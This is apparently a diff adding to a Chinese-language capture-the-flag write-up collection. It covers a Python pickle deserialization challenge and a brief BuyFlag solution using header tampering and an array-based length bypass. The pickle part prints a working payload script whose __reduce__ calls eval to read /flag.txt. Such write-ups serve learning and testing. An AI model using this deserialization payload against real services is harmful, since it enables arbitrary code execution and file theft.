@@ -979,4 +979,31 @@ class AdminHandler(BaseHandler):
             return self.render('form.html', res='This is Black Technology!', member=0)
 
 ```
-这里面有个pickle，和php的序列化那是一个东西，这里完全没有任何的过滤，另外，在models.py中还有一个`desc = "hint:I'm flag man"`并写入到了数据库。
+这里面有个pickle，和php的序列化那是一个东西，这里完全没有任何的过滤，另外，在models.py中还有一个`desc = "hint:I'm flag man"`并写入到了数据库。  
+猜测是使用反序列化漏洞读取文件。看了dalao的博客发现可以加以利用，[资料](http://www.polaris-lab.com/index.php/archives/178/)，并且还有dalao写了极为完善的[脚本](https://github.com/sensepost/anapickle/blob/master/anapickle.py)，尝试使用dalao的脚本：
+```
+import os
+import marshal
+import base64
+import _pickle as cPickle
+import urllib
+
+class genpoc(object):
+    def __reduce__(self):
+        return (eval, ("open('/flag.txt','r').read()",))
+
+e = genpoc()
+poc = cPickle.dumps(e)
+
+print (urllib.parse.quote(poc))
+```
+这里要注意的是要用python2去生成，python3生成出来的东西没有办法使用qaq。  
+得到flag
+
+----
+# [极客大挑战 2019]BuyFlag
+首先进去又是熟悉的主页，然后我们发现header里面有一个user=0，改成user=1，提示输入password，查看源码发现有post字样，典型的加空格绕过，但是我post过后没有任何的反应？？？？  
+查看wp后发现我header又是里面没有`Content-Type: application/x-www-form-urlencoded`。然后又提示我pay，于是post上去money=100000000，提示过长，数组绕过。  
+得到flag
+
+----
